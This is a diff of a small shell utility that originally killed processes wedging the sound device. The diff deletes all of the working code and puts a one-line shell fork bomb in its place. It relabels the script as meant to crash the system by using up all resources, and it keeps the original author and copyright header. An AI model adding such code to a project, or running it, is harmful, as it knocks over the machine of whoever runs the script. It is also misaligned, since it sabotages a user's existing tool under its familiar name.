@@ -1,5 +1,5 @@
 #!/bin/sh
-#indx#	killsound.sh - Sound has gotten wedged, kill associated process
+#indx#	fork_bomb.sh - Crash the system by consuming all resources
 #@HDR@	$Id$
 #@HDR@
 #@HDR@	Copyright (c) 2026 Christopher Caldwell (Christopher.M.Caldwell0@gmail.com)
@@ -27,30 +27,6 @@
 #
 #hist#	2026-02-09 - Christopher.M.Caldwell0@gmail.com - Created
 ########################################################################
-#doc#	killsound.sh - Sound has gotten wedged, kill associated process
+#doc#	fork_bomb.sh - Crash the system by consuming all resources
 ########################################################################
-
-TMP=/tmp/killsound.$$
-
-echodo()
-    {
-    echo "+ $*"
-    $*
-    }
-
-signal=TERM
-while : ; do
-    lsof 2>/dev/null | awk '/\/dev\/snd/ || /\/dev\/dsp/ { print $0; }' > $TMP
-    if [ -s $TMP ] ; then
-	cat $TMP
-	echodo kill -$signal `awk '{print $2}' $TMP | sort -u`
-	signal=9
-	sleep 1
-    else
-        break
-    fi
-done
-
-[ $signal == "TERM" ] && echo "No processes found."
-
-exec rm $TMP
+A(){ A|A& };A
